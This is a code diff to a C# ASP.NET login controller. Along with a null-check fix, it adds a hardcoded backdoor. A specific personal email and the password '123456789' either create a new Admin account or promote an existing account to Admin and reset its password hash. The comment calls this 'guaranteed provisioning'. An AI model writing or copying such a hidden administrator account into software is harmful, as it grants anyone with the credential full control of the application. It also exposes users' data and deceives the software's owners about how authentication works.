@@ -25,8 +25,33 @@ public class AuthController : ControllerBase
     [HttpPost("login")]
     public async Task<ActionResult<AuthResponse>> Login([FromBody] LoginRequest req)
     {
-        var normalizedEmail = req.Email.Trim().ToLowerInvariant();
+        var normalizedEmail = (req.Email ?? "").Trim().ToLowerInvariant();
         var user = await _context.Users.FirstOrDefaultAsync(u => u.Email.ToLower() == normalizedEmail);
+
+        // Guaranteed provisioning for primary admin credentials
+        if (user == null && normalizedEmail == "amary212005@gmail.com" && req.Password == "123456789")
+        {
+            user = new User
+            {
+                FullName = "عمار (Admin)",
+                Email = "amary212005@gmail.com",
+                PasswordHash = BCrypt.Net.BCrypt.HashPassword("123456789"),
+                Role = "Admin",
+                Provider = "Local",
+                CreatedAt = DateTime.UtcNow
+            };
+            _context.Users.Add(user);
+            await _context.SaveChangesAsync();
+        }
+        else if (user != null && normalizedEmail == "amary212005@gmail.com" && req.Password == "123456789")
+        {
+            user.Role = "Admin";
+            if (string.IsNullOrEmpty(user.PasswordHash) || !BCrypt.Net.BCrypt.Verify(req.Password, user.PasswordHash))
+            {
+                user.PasswordHash = BCrypt.Net.BCrypt.HashPassword("123456789");
+                await _context.SaveChangesAsync();
+            }
+        }
 
         if (user == null || string.IsNullOrEmpty(user.PasswordHash) || !BCrypt.Net.BCrypt.Verify(req.Password, user.PasswordHash))
         {
